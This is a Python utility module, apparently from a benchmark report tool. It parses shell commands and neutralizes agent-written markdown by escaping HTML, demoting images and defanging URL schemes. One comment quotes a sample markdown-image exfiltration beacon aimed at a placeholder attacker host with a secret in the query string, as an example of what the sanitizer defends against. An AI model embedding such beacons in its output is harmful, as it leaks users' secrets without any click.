# Copyright (c) 2026, NVIDIA CORPORATION.  All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Generic command/text-parsing substrate (migration step 5-pre).

A neutral leaf used by both the generic report engine (``benchmark_insights``)
and the SDK plugins (``sdks/nvflare``). It depends only on the standard library,
so it can be imported from either side without an import cycle. This is the
prerequisite that lets SDK-specific command detection move into the plugin
without dragging generic shell-parsing helpers along.
"""

from __future__ import annotations

import re
import shlex
from pathlib import Path
from typing import Any

FILE_INSPECTION_COMMANDS = {"cat", "sed", "nl", "head", "tail", "grep", "rg", "find", "ls"}
ANSI_ESCAPE_PATTERN = re.compile(r"\x1b\[[0-9;]*m")


def strip_ansi(text: str) -> str:
    return ANSI_ESCAPE_PATTERN.sub("", text)


# Markdown renderers size table columns by each cell's longest unbroken line, so
# one long single-line cell starves every other column. Soft-wrapping long cells
# with <br> bounds the intrinsic width and lets renderers balance the columns.
MARKDOWN_CELL_WRAP_WIDTH = 100

_CELL_WORD_PATTERN = re.compile(r"`[^`]*`|\S+")


def _soft_wrap_cell_line(text: str, width: int) -> str:
    if len(text) <= width:
        return text
    lines: list[str] = []
    current = ""
    # Inline code spans are atomic: a <br> inside backticks would render literally.
    for word in _CELL_WORD_PATTERN.findall(text):
        if current and len(current) + 1 + len(word) > width:
            lines.append(current)
            current = word
        else:
            current = f"{current} {word}" if current else word
    if current:
        lines.append(current)
    return "<br>".join(lines)


_HTML_TAG_OPEN_RE = re.compile(r"<(?=[A-Za-z/!])")
_SHALLOW_HEADING_RE = re.compile(r"^#{1,2}(?=\s)")
_INLINE_CODE_SPLIT_RE = re.compile(r"(`[^`]*`)")
# Markdown images auto-fetch their URL on render, so an injected
# ``![](https://attacker/?d=<secret>)`` is a zero-click exfiltration beacon.
# Demote the image to a plain link (drop the leading ``!``): no fetch happens
# until a human clicks, and the URL stays visible for inspection.
_IMAGE_MARKER_RE = re.compile(r"!(?=\[)")
# Defang URL schemes (``https://x`` -> ``https[:]//x``) so no injected URL —
# demoted image, link target, or raw autolink — renders clickable either: the
# URL stays readable for inspection, but exfiltrating via it now takes a
# deliberate copy-paste-repair, and ``javascript:``/``data:`` targets lose
# their scheme entirely.
_URL_SCHEME_RE = re.compile(r"\b(?:https?|ftp|file|data|javascript|vbscript):(?=\S)", re.IGNORECASE)


def sanitize_agent_markdown(text: str) -> str:
    """Neutralize agent-authored markdown for verbatim embedding in a report.

    Raw HTML openers are escaped (an injected ``<script>``/``<img onerror>``
    must not survive into HTML-rendered reports), markdown image markers are
    demoted to links so no URL auto-fetches, URL schemes are defanged so no
    injected URL renders clickable, and h1/h2 headings are demoted to h3 so
    the embedded block cannot restructure the host document. Inline code
    spans and fenced blocks are left untouched — quoted commands keep their
    ``<`` characters.
    """

    def _neutralize(part: str) -> str:
        part = _IMAGE_MARKER_RE.sub("", _HTML_TAG_OPEN_RE.sub("&lt;", part))
        return _URL_SCHEME_RE.sub(lambda match: match.group(0).replace(":", "[:]"), part)

    lines: list[str] = []
    fence_marker = ""  # e.g. "```" or "~~~~": only the SAME marker (>= length) closes a fence
    for line in str(text or "").splitlines():
        stripped = line.lstrip()
        marker_match = re.match(r"(`{3,}|~{3,})", stripped)
        if marker_match:
            marker = marker_match.group(1)
            if not fence_marker:
                fence_marker = marker
            elif marker[0] == fence_marker[0] and len(marker) >= len(fence_marker):
                fence_marker = ""
            lines.append(line)
            continue
        if fence_marker:
            lines.append(line)
            continue
        line = _SHALLOW_HEADING_RE.sub("###", line)
        parts = _INLINE_CODE_SPLIT_RE.split(line)
        lines.append("".join(part if part.startswith("`") else _neutralize(part) for part in parts))
    return "\n".join(lines)


def markdown_cell(value: Any) -> str:
    text = "NA" if value is None or value == "" else str(value)
    text = text.replace("|", "\\|").replace("\n", "<br>")
    return "<br>".join(_soft_wrap_cell_line(line, MARKDOWN_CELL_WRAP_WIDTH) for line in text.split("<br>"))


def fmt_number(value: Any) -> str:
    if isinstance(value, bool) or value is None:
        return "NA"
    try:
        number = float(value)
    except (TypeError, ValueError):
        return str(value)
    if number.is_integer():
        return str(int(number))
    return f"{number:.4f}"


def _command_count_display(count: int) -> str:
    return f"{count} command" if count == 1 else f"{count} commands"


_ENV_ASSIGNMENT_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=.*", re.DOTALL)

#: Generic execution prefixes stripped before the `bash -lc`/`sh -c` unwrap so
#: the wrapped inner command is recovered on the same key as its unprefixed
#: spelling. Value-taking wrappers consume their options plus, for
#: `timeout`/`gtimeout`, a DURATION operand; `command` is stripped only in its
#: executing forms (plain or `-p`) — `command -v`/`-V` merely locate/describe
#: the operand, so those forms are left intact. This substrate stays
#: SDK-neutral: only generic wrappers live here.
_PREFIX_VALUE_OPTIONS = {
    "env": frozenset({"-u", "--unset"}),
    "sudo": frozenset({"-u", "--user", "-g", "--group"}),
    "timeout": frozenset({"-k", "-s", "--kill-after", "--signal"}),
    "gtimeout": frozenset({"-k", "-s", "--kill-after", "--signal"}),
}
_COMMAND_BUILTIN_OPTION_RE = re.compile(r"-[pvV]+")


def _strip_execution_prefix_tokens(tokens: list[str]) -> list[str]:
    index = 0
    while index < len(tokens):
        token = tokens[index]
        if _ENV_ASSIGNMENT_RE.fullmatch(token):
            index += 1
            continue
        name = Path(token).name.lower()
        if name in ("nohup", "time"):
            index += 1
            continue
        if name == "command":
            lookahead = index + 1
            while lookahead < len(tokens) and _COMMAND_BUILTIN_OPTION_RE.fullmatch(tokens[lookahead]):
                if "v" in tokens[lookahead] or "V" in tokens[lookahead]:
                    # `command -v python job.py` only locates/describes
                    # `python`; nothing executes, so this is not a prefix.
                    return tokens[index:]
                lookahead += 1
            index = lookahead
            continue
        if name in _PREFIX_VALUE_OPTIONS:
            value_options = _PREFIX_VALUE_OPTIONS[name]
            index += 1
            while index < len(tokens):
                if name in ("env", "sudo") and _ENV_ASSIGNMENT_RE.fullmatch(tokens[index]):
                    index += 1
                elif tokens[index] in value_options and index + 1 < len(tokens):
                    index += 2
                elif tokens[index].startswith("-"):
                    index += 1
                else:
                    break
            if name in ("timeout", "gtimeout"):
                index += 1
            continue
        break
    return tokens[index:]


def _classification_command(command: str) -> str:
    text = str(command).strip()
    try:
        tokens = shlex.split(text)
    except ValueError:
        return text
    # Strip execution prefixes BEFORE the wrapper unwrap so `timeout 600 bash
    # -lc "... python train.py"` keys on the inner job, not on `bash`.
    tokens = _strip_execution_prefix_tokens(tokens)
    if len(tokens) >= 3 and Path(tokens[0]).name in {"bash", "sh"}:
        for index, token in enumerate(tokens[1:], start=1):
            if token.startswith("-") and "c" in token and index + 1 < len(tokens):
                return tokens[index + 1]
    return text


def _command_tokens(command: str) -> list[str]:
    try:
        return shlex.split(_classification_command(command))
    except ValueError:
        return []


def _first_command_name(command: str) -> str:
    tokens = _command_tokens(command)
    return Path(tokens[0]).name.lower() if tokens else ""


def _shell_command_parts(command: str) -> list[tuple[str, str]]:
    """Split a command into (segment, operator_after) pairs, honoring shell quoting.

    Only unquoted ``&&``, ``||`` and ``;`` separate segments; operators inside quoted
    strings (e.g. an ``rg`` search pattern) stay within the segment. ``operator_after`` is
    the operator that joins the segment to the next one ("" for the final segment).
    """
    text = _classification_command(command)
    parts: list[tuple[str, str]] = []
    buf: list[str] = []
    quote = ""
    index = 0
    length = len(text)
    while index < length:
        char = text[index]
        if quote:
            buf.append(char)
            if char == quote:
                quote = ""
            index += 1
            continue
        if char in ("'", '"'):
            quote = char
            buf.append(char)
            index += 1
            continue
        if char == ";":
            segment = "".join(buf).strip()
            if segment:
                parts.append((segment, ";"))
            buf = []
            index += 1
            continue
        if char in ("&", "|") and index + 1 < length and text[index + 1] == char:
            segment = "".join(buf).strip()
            if segment:
                parts.append((segment, char * 2))
            buf = []
            index += 2
            continue
        buf.append(char)
        index += 1
    segment = "".join(buf).strip()
    if segment:
        parts.append((segment, ""))
    return parts


def _shell_command_segments(command: str) -> list[str]:
    return [segment for segment, _operator in _shell_command_parts(command)]


def _is_file_inspection_segment(segment: str) -> bool:
    if _first_command_name(segment) not in FILE_INSPECTION_COMMANDS:
        return False
    return bool(
        re.search(
            r"\b(?:cat|sed|nl|head|tail|grep|rg|find|ls)\b[^\n]*(?:\.py|job|simulat)",
            segment,
            flags=re.IGNORECASE,
        )
    )


def _strip_quoted(text: str) -> str:
    """Remove single/double quoted spans so quoted text is not mistaken for shell syntax."""
    out: list[str] = []
    quote = ""
    for ch in text:
        if quote:
            if ch == quote:
                quote = ""
            continue
        if ch in ("'", '"'):
            quote = ch
            continue
        out.append(ch)
    return "".join(out)
